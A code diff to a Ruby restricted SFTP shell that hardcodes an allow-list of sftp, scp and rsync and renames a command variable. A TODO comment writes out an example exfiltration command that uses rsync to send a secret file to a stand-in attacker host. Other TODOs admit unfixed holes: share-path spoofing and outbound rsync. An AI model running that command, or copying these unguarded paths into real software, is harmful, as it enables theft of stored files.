@@ -7,6 +7,9 @@ require_relative 'config'
 require_relative 'errors'
 require_relative 'api'
 
+# Commands allowed in shell
+ALLOWED_COMMANDS = %w(sftp scp rsync)
+
 module SFTPShell
   class Shell
     attr_accessor :config,
@@ -23,29 +26,26 @@ module SFTPShell
 
     def exec
       @user = API::User.new @user_id
-
-      @logger.info "Authenticated user #{@user.id}"
+      @logger.info "Authenticated user #{@user_id} with command #{@original_command}"
       puts "sftp-shell: Welcome, #{@user.name}!"
 
-      if @original_cmd.nil?
-        false
-      else
-        parse_cmd
-        verify_access
-        execute_cmd
-        true
-      end
+      return false unless @original_command
+
+      parse_cmd
+      verify_access
+      execute_cmd
+      true
     rescue AccessDeniedError => _
-      @logger.warn "Access denied for user #{@user_id}: #{@original_cmd}"
-      puts "sftp-shell: #{@original_cmd}: Access denied."
+      @logger.warn "Access denied for user #{@user_id}: #{@original_command}"
+      puts "sftp-shell: #{@original_command}: Access denied."
       false
     rescue DisallowedCommandError => _
-      @logger.warn "Command not allowed for user #{@user_id}: #{@original_cmd}"
+      @logger.warn "Command not allowed for user #{@user_id}: #{@original_command}"
       puts "sftp-shell: #{@cmd.first}: Command not allowed."
       false
     rescue InvalidSharePathError => _
-      @logger.warn "Invalid share path for user #{@user_id}: #{@original_cmd}"
-      puts "sftp-shell: #{@original_cmd}: Invalid share path"
+      @logger.warn "Invalid share path for user #{@user_id}: #{@original_command}"
+      puts "sftp-shell: #{@original_command}: Invalid share path"
       false
     rescue ServerError => ex
       @logger.error "Server error for user #{@user_id}: #{@original_command}"
@@ -57,13 +57,13 @@ module SFTPShell
     private
 
     def parse_cmd
-      @cmd = Shellwords.shellwords @original_cmd
+      @cmd = Shellwords.shellwords @original_command
 
-      raise DisallowedCommandError unless @config['allowed_cmds'].include? @cmd.first
+      raise DisallowedCommandError unless ALLOWED_COMMANDS.include? @cmd.first
 
       # TODO: prevent running rsync client (ssh sftp@myhost 'rsync files/SECRET user@evilhost:SECRET')
       # TODO: prevent spoofing share path
-      @share_path = File.expand_path(File.join @config['storage_path'], @cmd.last)
+      @share_path = File.expand_path File.join @config['storage_path'], @cmd.last
 
       @logger.info "Accessing share path #{@share_path}"
     end
